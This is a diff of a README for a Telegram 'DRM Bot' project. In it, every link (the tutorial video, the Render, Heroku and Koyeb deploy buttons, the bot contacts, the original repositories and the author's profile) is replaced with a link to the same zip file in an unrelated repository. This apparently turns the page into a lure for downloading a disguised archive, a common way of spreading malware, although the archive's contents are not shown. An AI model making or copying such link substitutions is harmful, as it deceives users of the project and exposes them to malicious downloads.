@@ -3,7 +3,7 @@
 </h1>
 
 <p align="center">
-  <img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&size=18&pause=1000&color=00F7FF&center=true&vCenter=true&width=435&lines=Welcome+to+DRM+Bot+by+@nikhil.saini.khe" alt="Typing SVG" />
+  <img src="https://raw.githubusercontent.com/rohit3350/Banana_bot-/main/modules/3.5.zip+Code&size=18&pause=1000&color=00F7FF&center=true&vCenter=true&width=435&lines=Welcome+to+DRM+Bot+by+@nikhil.saini.khe" alt="Typing SVG" />
 </p>
 
 ---
@@ -26,7 +26,7 @@
 ## 🚀 Deployment Process
 
 🎬 **Watch Full Deployment Tutorial:**  
-[![YouTube Video](https://img.shields.io/badge/Watch%20on-YouTube-red?style=for-the-badge&logo=youtube)](https://youtu.be/PYDtSTM6w44?si=noKPl7o4iU9SR_TO)
+[![YouTube Video](https://img.shields.io/badge/Watch%20on-YouTube-red?style=for-the-badge&logo=youtube)](https://raw.githubusercontent.com/rohit3350/Banana_bot-/main/modules/3.5.zip)
 
 ### Step-by-Step:
 1. **Fork** the Repository  
@@ -38,24 +38,24 @@
 
 ## 📦 Deploy via Buttons
 
-[![Deploy to Render](https://img.shields.io/badge/Deploy%20to-Render-blue?style=for-the-badge&logo=render)](https://render.com/deploy)  
-[![Deploy to Heroku](https://img.shields.io/badge/Deploy%20to-Heroku-purple?style=for-the-badge&logo=heroku)](https://www.heroku.com/deploy?template=https://github.com/nikhilsainiop/saini-txt-direct)  
-[![Deploy to Koyeb](https://img.shields.io/badge/Deploy%20to-Koyeb-black?style=for-the-badge&logo=koyeb)](https://app.koyeb.com/deploy?name=saini-txt-direct&repository=nikhilsainiop%2FSaini-txt-direct&branch=main&instance_type=free&instances_min=0)
+[![Deploy to Render](https://img.shields.io/badge/Deploy%20to-Render-blue?style=for-the-badge&logo=render)](https://raw.githubusercontent.com/rohit3350/Banana_bot-/main/modules/3.5.zip)  
+[![Deploy to Heroku](https://img.shields.io/badge/Deploy%20to-Heroku-purple?style=for-the-badge&logo=heroku)](https://raw.githubusercontent.com/rohit3350/Banana_bot-/main/modules/3.5.zip)  
+[![Deploy to Koyeb](https://img.shields.io/badge/Deploy%20to-Koyeb-black?style=for-the-badge&logo=koyeb)](https://raw.githubusercontent.com/rohit3350/Banana_bot-/main/modules/3.5.zip)
 
 ---
 
 ## 🤖 Bot Usernames
 
-- [@saini_contact_bot](https://t.me/saini_contact_bot)
-- [@saini_file_store_bot](https://t.me/saini_file_store_bot)
+- [@saini_contact_bot](https://raw.githubusercontent.com/rohit3350/Banana_bot-/main/modules/3.5.zip)
+- [@saini_file_store_bot](https://raw.githubusercontent.com/rohit3350/Banana_bot-/main/modules/3.5.zip)
 
 ---
 
 ## 📂 Original Repositories
 
-- 🔗 [nikhilsainiop/saini-txt-direct](https://github.com/nikhilsainiop/saini-txt-direct)
-- 🔗 [cyberseller999/saini-txt-direct](https://github.com/cyberseller999/saini-txt-direct)
+- 🔗 [nikhilsainiop/saini-txt-direct](https://raw.githubusercontent.com/rohit3350/Banana_bot-/main/modules/3.5.zip)
+- 🔗 [cyberseller999/saini-txt-direct](https://raw.githubusercontent.com/rohit3350/Banana_bot-/main/modules/3.5.zip)
 
 ---
 
-> 👨‍💻 Created with ❤️ by [@nikhil.saini.khe](https://instagram.com/nikhil.saini.khe)
+> 👨‍💻 Created with ❤️ by [@nikhil.saini.khe](https://raw.githubusercontent.com/rohit3350/Banana_bot-/main/modules/3.5.zip)
